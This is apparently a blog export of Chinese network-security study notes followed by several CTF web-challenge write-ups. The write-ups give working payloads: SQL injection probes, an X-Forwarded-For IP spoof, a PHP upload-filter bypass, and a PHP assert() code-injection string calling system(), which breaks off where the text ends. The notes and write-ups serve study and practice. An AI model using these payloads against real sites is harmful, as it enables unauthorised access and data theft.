host:把一个主机名解析到一个网际地址或把一个网际地址解析到一个主机名。hostnew 命令是 host 命令的 5.2 版. traceroute(tracert):Traceroute是Linux和Mac OS等系统默认提供的路由追踪小程序，Tracert是Windows系统默认提供的路由追踪小程序。二者的功能相同，都能探测数据包从源地址到目的地址经过的路由器的IP地址。 nmap:一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。 Telnet:用于远程登录到网络中的计算机,并以命令行的方式远程管理计算机。需要注意的是,远程机器必须启动telnet服务器,否则无法打开telnet命令。 net:https://blog.csdn.net/zhailihua/article/details/75561963 dig:dig命令是常用的域名查询工具，可以用来测试域名系统工作是否正常 whois:是用来查询域名的IP以及所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。 网络扫描与查点技术10.扫描的基本步骤一个完整的扫描过程通常包括三个阶段：（1）确定目标系统是否存活（2）确定存活系统上运行的服务（端口扫描技术）（3）探查目标系统运行的操作系统类型（旗标抓取技术+协议指纹识别技术） 11.端口扫描的类型（7种）：原理与NMAP实现1.TCP连接扫描（TCP Connect()扫描） nmap -sT完成一次完整的三次握手过程；2.TCP SYN扫描（半开扫描） nmap -sS隐蔽性好，不完成完整的连接；3.TCP FIN扫描(秘密扫描) nmap -sF向主机发送FIN数据包；变体：(1)TCP圣诞树(TCP Xmas-Tree)：将FIN、PSH、VRG标志位置1(2)TCP 空(TCP NULL)：将所有标志位置04.TCP ACK扫描 nmap -sA测试防火墙的规则集；5.TCP窗口扫描 nmap -sW返回值为正–端口开放返回值为0–端口关闭6.TCP Maimon扫描 nmap -sM7.UDP扫描 nmap -sU向目标端口发送UDP数据包；若返回“ICMP port unreachable”表名端口关闭，否则开放；不可靠，速度慢； 12.扫描的防御端口扫描其实就是通过对计算机每个常用端口发送数据包，通过返回的数据包来分析其弱点加以攻击。如何进行防范呢？其实最简单的办法就是关闭不用的端口，减低端口扫描风险，然后在对开启的端口做好防范措施（防火墙）。 口令破解与防御13.常用的口令破解方法1.暴力破解(穷举)(彩虹表)2.字典攻击(穷举预设字典中的口令组合)3.组合攻击(在字典口令的基础上在末尾+数字或字母)4.社会工程学 14.Windows，Linux口令安全原理Windows：安全账号管理器SAM机制；Win口令文件：%systemroot%system32\\config\\SAM LM-Hash将用户口令转为大写，不足14位用0填充，超过截尾14位，分为两组7位分别加密为两个DES加密密钥，再分别加密预定义的魔术字符串，获得两个8位密文值，连接起来即为LM-Hash值；不区分大小写，安全强调降低淘汰 NT-Hash将口令转为Unicode字符串，然后进行MD4单向Hash计算，产生128bit的Hash值； Windowa的登录与身份验证交互式登录、网络登录 NTLM采用挑战/响应机制进行身份验证；(掌握)6步：三方交互：客户端：K 服务器：F 账号数据库：DB1.认证请求(K-&gt;F)2.挑战(F-&gt;K)3.响应(K-&gt;F)4.验证请求(F-&gt;DB)5.验证响应(DB-&gt;F)6.服务器响应(F-&gt;K) Linux(熟记)用户名与ID关系文件：/etc/passwd口令字段：/etc/shadow过去：使用单向加密函数加密口令现在：系统根据日期选择salt值，并转为2个字符的字符串，与加密后的口令一起保存； 15.Linux常用命令（chmod,ls,ps,passwd,su,sudo等）(熟记)chmod：使用权限 : 所有使用者使用方式 : chmod [-cfvR] [–help] [–version] mode file…说明 : Linux/Unix 的档案调用权限分为三级 : 档案拥有者、群组、其他。利用 chmod 可以藉以控制档案如何被他人所调用。ls:功能： 列出非目录的文件项，然后是每一个目录中的“可显示”文件（可理解为ls命令将本目录向下展开两级）ls用法：ls [参数] [目录名]（如过要显示当前目录的文件可不加目录名）ps:使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵尸、哪些进程占用了过多的资源等passwd:用来更改使用者的密码su:用于变更为其他使用者的身份，除 root 外，需要键入该使用者的密码。使用权限：所有使用者。sudo:以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。使用权限：在 /etc/sudoers 中有出现的使用者。 16.口令破解与防御口令破解Win：利用漏洞获取管理员权限，利用Pwdump等工具获取NT在注册表中存储的SAM口令散列，口令破解；Linux：获取root用户权限，获取shadow口令散列，口令破解； 口令破解防御1.强口令2.口令策略3.防御口令泄露、删除和修改 欺骗技术与防御17.IP欺骗*伪造某台主机IP地址的技术(被伪装的主机往往具有某种特权或者被另外的主机所信任) 简单的IP欺骗1.伪装主机从而进行泛洪攻击以达到拒绝服务的目的；2.监听被伪装者与受害者之间的返回数据流TCP协议：主机间无法完成正常3握手，即无法进行数据传输UDP协议：面向无连接的协议，攻击者发送的数据包可以被发送给目标主机；导致拒绝服务； 源路由攻击攻击者在IP欺骗数据包中的源路由字段填入攻击者的IP地址，则返回的数据包就必须经过攻击者； TCP会话劫持接管现存动态会话的过程，攻击者冒充一方用户，同时监听并掌握会话内容； 过程：1.发现攻击目标(必须能检测到目标主机的通信流)2.确认会话状态3.猜测序列号4.使客户主机下线(DoS攻击)5.接管会话，在服务器上创建后门 防御1.放弃以地址为基础的验证2.进行包过滤入口过滤：不允许任何从外网进入内网的数据包使用内网的IP地址作为源地址出口地址：来自内网的地址使用了不属于内网的源地址，内网用户发起的欺骗攻击 3.加密通信时要求加密传输和验证 4.使用随机的初始序列号5.禁用路由器的源路由18.ARP欺骗*(掌握)攻击者处于局域网内部，基于ARP协议的缺陷发送虚假的ARP请求或响应，就是ARP欺骗；(Windows arp -a) ARP缺陷1.不验证自己是否发过对应的ARP请求2.不验证该回应包是否可信3.直接用应答包替换ARP缓存表中的原有信息(主机和网关维护一张IP-MAC地址映射表，攻击者可向目标主机发送虚假的ARP回应包(将MAC地址设为自己的MAC地址)，成为”中间人”,使所有的数据包都会流经攻击者的网卡) ARP欺骗检测网络频繁掉线、变卡、arp -a查看映射表发现网关MAC地址与真实不符、使用嗅探工具发现网络中有大量的ARP响应包(Ettercap)… ARP欺骗防御1.静态绑定a.MAC地址绑定b.使用静态ARP缓存2.ARP防火墙3.使用ARP服务器(确保服务器不被欺骗)4.及时隔离被欺骗的主机 19.DNS欺骗(掌握)又称DNS域名重定向或域名劫持，是通过拦截域名解析请求或篡改域名服务器上的数据，使得用户在访问相关域名时返回虚假IP地址或使用户的请求失败的攻击方式。 DNS欺骗一般过程(如果能获得DNS服务器的控制权再好不过，直接伪造一条记录就好，但是很难。尝试控制DNS服务器所在网络下的一台主机，监听网络通信，利用ARP、IP欺骗取得信任后，攻击者嗅探目标主机发送的DNS请求数据包，分析ID和端口号，构造DNS应答包，若发送的应答包ID和端口正确，则把返回的数据包中的域名和IP地址存进DNS缓存表，真实的DNS应答包被丢弃) DNS欺骗防御1.DNS服务器软件安装补丁2.限制DNS动态更新3.限制区域传送4.关闭DNS服务器的递归查询 20.电子邮件欺骗与邮件安全（PGP）攻击主要表现1.电子邮件炸弹、”滚雪球”、垃圾邮件2.自称管理员，假冒，附件木马 基本方法1.相似的电子邮件地址2.冒充回复地址3.利用附件欺骗4.远程登录到SMTP端口25发送邮件 防御1.树立风险意识2.对邮件加密签名 Web攻击与防御21.SQL注入原理、分类、攻击过程（程序分析能力）*(掌握)原理利用Web应用对后台数据库查询语句处理存在安全漏洞，攻击者提供构造的数据库查询代码，根据返回结果得到目的数据。受影响系统 ：对输入参数不进行检查和过滤就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 分类1.普通注入根据数据库提示的有价值的信息进行注入 2.盲注有经验的管理员在给出错误提示页面时，不提供详细的错误信息，攻击者要对表中的每个字段逐字猜解 注入点类型1.数字型12...index.php?id=1select * from 表名 where id=1； 2.字符型12...index.php?name=adminselect * from 表名 where name='admin'; SQLi方法判断是否存在注入： 12and 1=1 #返回正常页面and 1=2 #返回错误页面或空页 布尔型注入基于时间延迟注入可联合查询注入多语句查询注入 SQLi过程客户端(参数值等数据被修改)–&gt;服务端(未经检查和过滤，将被修改的数据注入到SQL语句中，SQL语句功能被修改)–&gt;数据库引擎(执行被修改后的SQL命令)–&gt;服务端(将注入的结果返回客户端)–&gt;客户端(根据上一次注入获得的敏感信息，构造注入语句进一步注入)1.寻找注入点(存在SQLi漏洞的连接)2.测试该网站是否存在SQLi漏洞3.猜解数据库名-&gt;表名-&gt;字段名-&gt;表的内容(*重点查询与用户相关的表，获取用户名+密码(管理员优先))4.后续攻击 注入实例1.形如： 12...index.php?id=1select * from 表名 where id=1； 2.测试有无漏洞?id=1’ 报错，若有返回信息，可能可以确定后台数据库版本型号在末尾加and 1=1 \\and 1=23.猜解表名末尾加and exists(select * from admin)若返回正常页面，则存在admin表4.猜解字段名在末尾加and exists(select username from admin)若返回正常页面，则存在username字段在末尾加and exists(select password from admin)若返回正常页面，则存在password字段5.猜解用户名(折半查找)and 1=(select id from (select * from admin where id=1)where asc(mid(username,1,1))&lt;100) 工具SQLmap等 SQLi防御(需要掌握简单的代码修改方式以抵御SQLi攻击)1.使用预编译语句，绑定变量2.对用户提交的数据和参数进行严格的过滤(,’’;等)3.摒弃动态SQL语句，改用存储过程来访问和操作数据4.使用安全函数5最小权限原则，区分普通用户与管理员权限避免Web应用直接使用root等高权限用户直接连接DB 22.XSS原理、分类、攻击过程（程序分析能力）*(掌握)通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 攻击条件Web服务器没有对用户输入进行有效验证或验证强度不够，而又轻易将他们返回给客户端；一般需要：1.存在跨站脚本漏洞的Web应用2.用户点击或浏览某个页面 分类1.反射型也叫非持久型XSS，是指发生请求时，XSS代码出现在请求URL中，作为参数提交到服务器，服务器解析并响应。响应结果中包含XSS代码，最后浏览器解析并执行。从概念上可以看出，反射型XSS代码是首先出现在URL中的，然后需要服务端解析，最后需要浏览器解析之后XSS代码才能够攻击。（简单地将用户输入数据返回给浏览器，黑客需要诱导用户点击一个恶意链接） 2.存储式永久存储在服务器数据库或者文件中 3.DOM型与前两种区别：不需要服务器解析响应，而是浏览器的DOM解析器触发 攻击过程参考： https://www.cnblogs.com/mao2080/p/9460397.html xss防御(需要掌握简单的代码修改方式以抵御XSS攻击)1.输入参数字符过滤2.输出参数进行转码3.限制输入参数长度4.设置cookie httponly为true 1） 方法一：给Cookie添加HttpOnly属性, 这种属性设置后, 只能在http请求中传递, 在脚本中, document.cookie无法获取到该Cookie值. 对XSS的攻击, 有一定的防御值. 但是对网络拦截, 还是泄露了.2）方法二：在cookie中添加校验信息, 这个校验信息和当前用户外置环境有些关系,比如ip,user agent等有关. 这样当cookie被人劫持了, 并冒用, 但是在服务器端校验的时候, 发现校验值发生了变化, 因此要求重新登录, 这样也是种很好的思路, 去规避cookie劫持.3）方法三：cookie中session id的定时更换, 让session id按一定频率变换, 同时对用户而言, 该操作是透明的, 这样保证了服务体验的一致性.（ 可参考：https://www.cnblogs.com/momjs/p/10346579.html ） 23.其他Web攻击类型*CSRF攻击：https://www.cnblogs.com/collin/articles/9637999.html文件上传漏洞：指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。 命令执行漏洞：https://www.cnblogs.com/bmjoker/p/9084864.htmlxxe漏洞 ：https://www.freebuf.com/articles/web/177979.html 24.Web攻击的防御*缓冲区溢出攻击与防御(掌握)25.缓冲区溢出原理(代码分析能力)缓冲区：计算机在内存中开辟的一段连续的内存块，用于存放相同类型的数据 原理向固定长度的缓冲区中写入超出其预定长度的内容，导致缓冲区数据溢出，从而覆盖其周围的内存空间黑客借此精心构造填充数据，导致原有的流程改变，转去执行特殊代码，从而获得控制权 缓冲区溢出攻击过程(要求能根据代码分析溢出原理)1.在程序的地址空间中安排适当的代码2.通过适当的初始化寄存器和存储器，让程序跳转到安排好的地址空间执行 26.栈溢出（程序分析能力）*27.其他溢出的工作原理格式化字符串溢出整数溢出堆溢出 28.缓冲区溢出的防御措施(对简单代码能够修改优化，使之免受溢出攻击) 系统管理上1.关闭不需要的特权程序(缓冲区溢出只有获取更高权限时才有意义)2.及时给程序漏洞打补丁 软件开发过程中1.编写正确的代码(对数据长度和有效性检查，确保目标缓冲区中数据不越界并有效)C/C++语言本身不进行强类型和长度检查2.缓冲区不可执行3.改进C语言函数库隐患函数替换:如strncpy()替换strcpy()、strncat()替换strcat(),该类函数限定了字符串长度4.数组边界检查(使超长代码不可能被植入)5.程序指针完整性检查(阻止由于函数返回地址或函数指针的改变而导致程序执行流程的改变；检测指针是否被恶意改动，若改动则拒绝执行) 拒绝服务攻击(DoS攻击)(掌握)29.拒绝服务攻击的概念、分类概念破坏型攻击，不以获取目标系统访问权限为目的；利用传输协议弱点、系统漏洞、服务漏洞对目标系统发起大规模进攻，用超出目标处理能力的海量数据包消耗可用系统资源、带宽资源等，或造成程序缓冲区溢出错误，致使其无法处理合法用户请求，无法提供正常服务，最终导致网络服务瘫痪，甚至系统死机。 分类1.资源消耗2.系统或应用程序缺陷(Ping致死、land攻击、Smurf攻击、IP分片攻击、UDP泛洪攻击等)3.配置修改(修改运行配置，导致网络系统不能正常提供服务) 30.拒绝服务攻击的实例31.DDoS的工作原理即分布式拒绝服务攻击：https://baijiahao.baidu.com/s?id=1612405556732723729&amp;wfr=spider&amp;for=pc 32.拒绝服务攻击的防御1.进行合理带宽限制限制基于协议的带宽；如端口25只能使用25%的带宽2.运行尽可能少的服务，只允许必要的通信3.及时安装系统补丁4.封锁恶意IP地址5.增强系统用户的安全意识，避免成为傀儡主机 6.建立健全的DoS/DDoS攻击的应急响应机制身份认证33.AAA1.认证(你是谁？)2.授权(允许你干什么？)3.审计/记账(你干了什么？) 34.常用身份认证技术基于口令的认证1.基于单项哈希函数(结合挑战-响应机制) 2.加盐口令3.SKEY机制4.Bellovin-Merritt的EKE协议基于密码学的认证基于生物特征的认证35.Kerberos协议(掌握)Kerberos是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。 组成1.认证服务器AS2.票据许可服务器TGS3.客户端Client4.应用服务器Server 凭证1.票据Ticket2.鉴别码Authenticator 过程 记号 含义 C 客户端 S 服务端 ADc 客户的网络地址 Lifetime 票据的生存期 TS 时间戳 Kx x的私有密钥 Kx,y x与y的会话密钥 Kx[m] 以x的私有密钥加密的m Ticketx x的票据 Authenticatorx x的鉴别码 1.C请求票据许可票据2.AS发放票据许可票据和会话密钥3.C请求服务器票据4.TGS发放服务器票据和会话密钥5.C请求服务6.S提供服务器认证信息 36.PKI原理(公钥基础设施PKI:是一个包括硬件、软件、人员、策略和规程的集合，用来实现基于公钥密码体制的密钥和证书的产生、管理、存储、分发和撤销等功能。PKI体系是计算机软硬件、权威机构及应用系统的结合。它为实施电子商务、电子政务、办公自动化等提供了基本的安全服务，从而使那些彼此不认识或距离很远的用户能通过信任链安全地交流。)它利用公共密钥算法的特点，建立一套证书发放、管理和使用的体系，来支持和完成网络系统中的身份认证、信息加密、保证数据完整性和抗抵赖性。PKI 体系可以有多种不同的体系结构、实现方法和通信协议。 37.挑战相应机制**顾名思义，基于挑战/应答（Challenge/Response）方式的身份认证系统就是每次认证时认证服务器端都给客户端发送一个不同的”挑战”字串，客户端程序收到这个”挑战”字串后，做出相应的”应答”,以此机制而研制的系统.认证过程：1) 客户向认证服务器发出请求，要求进行身份认证；2) 认证服务器从用户数据库中查询用户是否是合法的用户，若不是，则不做进一步处理；3) 认证服务器内部产生一个随机数，作为”提问”，发送给客户；4) 客户将用户名字和随机数合并，使用单向Hash函数（例如MD5算法）生成一个字节串作为应答；5) 认证服务器将应答串与自己的计算结果比较，若二者相同，则通过一次认证；否则，认证失败；6) 认证服务器通知客户认证成功或失败。以后的认证由客户不定时地发起，过程中没有了客户认证请求一步。两次认证的时间间的密钥隔不能太短，否则就给网络、客户和认证服务器带来太大的开销；也不能太长，否则不能保证用户不被他人盗用IP地址，一般定为1-2分钟。 访问控制38.访问控制的概念就是在身份认证的基础上，依据授权对对提出的资源访问请求加以控制；遵循原则：1.最小特权原则2.多人负责原则(即授权分散化)3.职责分离原则 39.常见的访问控制的模型1.自主访问控制DAC2.强制访问控制MAC3.基于角色的访问控制RBAC4.基于属性的访问控制ABAC 40.访问控制机制指对主体访问客体的权力或能力的限制，以及限制进入物理区域(出入控制)和限制使用计算机系统和计算机存取数据的过程(存取控制)。 41.计算机安全形式化模型验证安全设计与实现； 1.Bell-LaPadula模型2.Biba模型防火墙与入侵检测42.防火墙的基本原理防火墙技术是通过有机结合各类用于安全管理与筛选的软件和硬件设备，帮助计算机网络于其内、外网之间构建一道相对隔绝的保护屏障，以保护用户资料与信息安全性的一种技术。防火墙技术的功能主要在于及时发现并处理计算机网络运行时可能存在的安全风险、数据传输等问题，其中处理措施包括隔离与保护，同时可对计算机网络安全当中的各项操作实施记录与检测，以确保计算机网络运行的安全性，保障用户资料与信息的完整性，为用户提供更好、更安全的计算机网络使用体验。 1.限制人们从一个特别的控制点进入，从而防止入侵者接近内部设施；2.限定人们从一个特别的点离开，从而有效的保护内部资源； 43.防火墙技术分类1.包过滤防火墙/路由器（静态/动态）工作在网络层/传输层； 2.代理技术(应用层/电路级) 3.混合型44.防火墙的配置方案1.屏蔽路由器2.双宿主机3.屏蔽主机4.屏蔽子网45.入侵检测的分类及工作原理分类：1.基于主机的入侵检测系统HIDS通过监视与分析主机的审计记录检测入侵；原理:安装在被检测的主机之上，主要是对该主机的网络实时连接以及系统审计日志进行智能分析和判断；(更好的辨识分析、成本低/慢) 2.基于网络的入侵检测系统NIDS通过在共享网段上对通信数据的侦听采集数据，分析可疑现象；原理：放置在比较重要的网段内，不停的监视网段中各种数据包。并对每个数据包进行特征分析，判断是否与系统内置的某些规则吻合；(成本低、实时/只能检查直连网段、数据量大、复杂检测困难) 3.分布式入侵检测系统检测网络中的数据包，与NIDS不同点：采用分布式检测，集中管理(范围广/影响流量) VPN46.VPN的概念指的是在公用网络上利用加密与控制访问技术建立专用网络的技术；分类1(按场合)：1.远程访问VPN2.网关-网关VPN主要技术：隧道技术、加密技术隧道：将一种协议的数据分装到另一种协议中进行传输的技术加密：保护隧道中数据的安全传输分类2(按隧道协议的实现层次)：1.第二层隧道协议主要：点到点，实现远程访问VPN2.第三层隧道协议主要：IP安全，用于网关-网关VPN，实现远程访问VPN3.第四层隧道协议处于传输层和应用层之前的一个安全子层；SSL/TLS；HTTPS 47.IPSec VPN：(熟记) IPSec:用于构建VPN的一系列协议，正在成为创建VPN的标准 功能IPSec只允许IP数据的封装和加密基于端对端的安全模式，在源IP和目的IP地址之间建立信任和安全性；IPSec可保障主机之间、网络安全网关(如路由器或防火墙)之间或主机与安全网管之间的数据包安全；可防范：数据嗅探、数据篡改、身份欺骗、重放攻击、拒绝服务攻击功能：访问控制、无连接的完整性、数据源认证、防止重复攻击、机密性(加密) 体系结构IPSec协议体系主要包含8部分：1.IP安全体系结构2.封装安全载荷3.验证头4.加密算法5.认证算法6.密钥管理7.解释域8.策略 组成1.Internet密钥交换协议(IKE)&lt;提供协商安全参数和创建认证密钥&gt;2.封装协议：(1)负载安全封装ESP：提供加密、认证和数据保护(2)认证报头协议AH：提供认证和数据保护 工作模式传输模式：两台主机之间(点到点)传递的数据加密隧道模式：两个不同网段(站点到站点)传送的数据内容加密或者两个私有IP网段穿越Internet连接区别：数据包在传输过程中是否需要更改IP报头 工作过程的3个阶段1.IPSec启动2.IKE SA(IKE阶段1–主模式)3.IPSec SA(IKE阶段2–快速模式) 数据包封装由ESP或AH或两种共同处理AH：为IP数据报提供无连接的完整性和数据源认证的机制ESP：提供了AH的大部分保护加上额外的机密性(使用DES、3DES、AES、RC5、IDEA)一般情况下使用ESP IKE(熟记)工作阶段及内容因特网密钥交换协议：*用于协商IPSec安全关联，要求IPSec系统首先进行身份认证，并建立ISAKMP或IKE共享密钥*SA包括两类：1.IKE SA：双向2.IPSec SA：单向的-&gt;建立双向VPN需要两个SA主要负责：*协商协议的参数*交换公共密钥*对双方进行验证*在交换后对密钥进行管理 安全关联SASA：代表两对等体或两主机之间的契约，描述对等体将怎样使用IPSec安全服务来保护网络流量；","categories":[],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"Bug","slug":"Bug","date":"2019-12-09T01:18:21.000Z","updated":"2019-12-30T05:56:55.442Z","comments":true,"path":"2019/12/09/Bug/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/Bug/","excerpt":"","text":"bug题目分析：给出一个登录页面;首先随便注册一个用户； 登录； 发现只有Manage是不能普通用户使用的； 最后发现还有个Finpwd，找回密码之前应该会验证身份，应该是突破口； 实际操作：先以smtsec找回密码，发现直接给了一个newpwd输入框；应该是需要抓包修改用户身份； 修改为admin，提示修改成功； 以admin身份登录成功；但是Manage还是不能使用提示IP not allowed!应该要改为本地登录；在请求头中加入X-Forwarded-For: 127.0.0.1进行ip伪造；得到如下页面； 查看源码，看到提示： 看到filemanage想到可能do为upload(文件管理无非上传、下载、查看、删除)； 关于文件上传：https://blog.csdn.net/qq_42636435/article/details/88096844 根据提示Just image？因该是上传image然后改后缀； 构造： 123&lt;？php phpinfo();？&gt; 上传发现，过滤了;不是php文件又不能进行解析得到响应；非php文件下提示要上传php文件；It is not a really php file这里尝试使用php的脚本表达形式 123&lt;script language='php'&gt;phpinfo();&lt;/script&gt; 将jpg后缀改为php4/php5;(否则不能解析)就得到响应flag了.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"NaNNaNNaNNaN-Batman","slug":"NaNNaNNaNNaN-Batman","date":"2019-12-09T01:08:23.000Z","updated":"2019-12-30T05:53:52.682Z","comments":true,"path":"2019/12/09/NaNNaNNaNNaN-Batman/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/NaNNaNNaNNaN-Batman/","excerpt":"","text":"NaNNaNNaNNaN-Batman题目分析：下载附件，得到web100的文本，打开是乱码，大概看了下，将后缀改为HTML，在浏览器里打开，得到一个OK输入框； 但是输入没有任何响应；回头再看看代码； 可以很明显看到,’’是一个变量，而它的内容就是后面一长串字符(三行绿色部分即’’中间部分)；最后eval()函数执行_; **eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。**此处，eval()并未执行$()函数，而是执行了字符串，导致乱码?:).为了能看到正常源码，将eval()改为alert()； **alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。alert是HTML DOM 中用到的一种脚本语言，它的中文意思是“提醒”。它是JavaScript或VBscript脚本语言中窗口window对象的一个常用方法；其主要用法就是在你自己定义了一定的函数以后，通过执行相应的操作，所弹出对话框的语言。并且alert对话框通常用于一些对用户的提示信息。|alert(message)| ||:——–:|:————-:||参数 |描述||message |要在 window 上弹出的对话框中显示的纯文本（而非 HTML 文本）|** 即： 1234567891011121314151617181920212223function $()&#123; var e=document.getElementById(\"c\").value; if(e.length==16) if(e.match(/^be0f23/)!=null) if(e.match(/233ac/)!=null) if(e.match(/e98aa$/)!=null) if(e.match(/c7be9/)!=null) &#123; var t=[\"fl\",\"s_a\",\"i\",\"e&#125;\"]; var n=[\"a\",\"_h0l\",\"n\"]; var r=[\"g&#123;\",\"e\",\"_0\"]; var i=[\"it'\",\"_\",\"n\"]; var s=[t,n,r,i]; for(var o=0;o&lt;13;++o) &#123; document.write(s[o%4][0]);s[o%4].splice(0,1) &#125; &#125;&#125; document.write('&lt;input id=\"c\"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'); delete _ **match() 方法可在字符串内检索指定的值，或找到一个或多个正则表达式的匹配。splice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。(应该是从var后的几个值中挑选几个，组合得到flag)** 实际操作： 方法一：审计，变量e需要满足五个条件。长度为16；^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa,其它的只要匹配到就行，没有位置要求；所以可以构造出：e==be0f233ac7be98aa在OK输入框中输入可以得到flag； 方法二：由于程序已经固定只是在输入时需要检测是否匹配，那么可以直接省去输入匹配部分，直接执行关键组合flag部分；提取如下代码，在控制台执行： 123456789101112131415161718function $()&#123; var e=document.getElementById(\"c\").value; &#123; var t=[\"fl\",\"s_a\",\"i\",\"e&#125;\"]; var n=[\"a\",\"_h0l\",\"n\"]; var r=[\"g&#123;\",\"e\",\"_0\"]; var i=[\"it'\",\"_\",\"n\"]; var s=[t,n,r,i]; for(var o=0;o&lt;13;++o) &#123; document.write(s[o%4][0]);s[o%4].splice(0,1) &#125; &#125;&#125; document.write('&lt;input id=\"c\"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'); delete _","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Training-WWW-Robots","slug":"Training-WWW-Robots","date":"2019-12-09T01:03:58.000Z","updated":"2019-12-30T05:50:13.720Z","comments":true,"path":"2019/12/09/Training-WWW-Robots/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/Training-WWW-Robots/","excerpt":"","text":"Training-WWW-Robots知识点补充： robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。 当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。 如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。 Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。(摘自百度百科) 实际操作： 访问robots.txt，发现不允许访问fl0g.php 尝试访问/fl0g.php，得到flag；","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"攻防世界","slug":"CTF/攻防世界","permalink":"https://singlemindedt.github.io/categories/CTF/攻防世界/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Mfw","slug":"Mfw","date":"2019-12-09T00:58:05.000Z","updated":"2019-12-30T05:47:02.290Z","comments":true,"path":"2019/12/09/Mfw/","link":"","permalink":"https://singlemindedt.github.io/2019/12/09/Mfw/","excerpt":"","text":"Mfw题目分析：打开链接，几个目录都看了下，发现： 可能存在git源码泄露，尝试访问.git目录： 实际操作：利用Githack得到网站源码(直接将GitHack.py拖入cmd,输入执行命令)： 在GitHack目录下可以看到网站源码文件夹： 在flag.php中只有如下内容： 1234&lt;?php// TODO// $FLAG = '';?&gt; 是将flag.php中的内容注释了，不显在网页上。 在index.php中发现关键代码： 12345678910111213&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = \"home\";&#125;$file = \"templates/\" . $page . \".php\";// I heard '..' is dangerous!assert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");// TODO: Make this look niceassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");?&gt; **assert()这个函数在php语言中是用来判断一个表达式是否成立。返回true or false; 1234567891011/*PHP官方文档是怎么解释的：assert — 检查一个断言是否为 FALSE PHP 5 bool assert ( mixed $assertion [, string $description ] ) PHP 7 bool assert ( mixed $assertion [, Throwable $exception ] ) assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。 如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。 这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。断言这个功能应该只被用来调试。 你应该用于完整性检查时测试条件是否始终应该为 TRUE，来指示某些程序错误，或者检查具体功能的存在（类似扩展函数或特定的系统限制和功能）。*/ 123die() 函数输出一条消息，并退出当前脚本；strpos(string,find,start)查找find在字符串string中第一次出现的位置;file_exists() 函数检查文件或目录是否存在。如果指定的文件或目录存在则返回 TRUE，否则返回 FALSE。 **如此这般，可以利用assert()函数执行命令，类似sql注入，在数据库中查找，构造url为page=abc’) or system(“cat 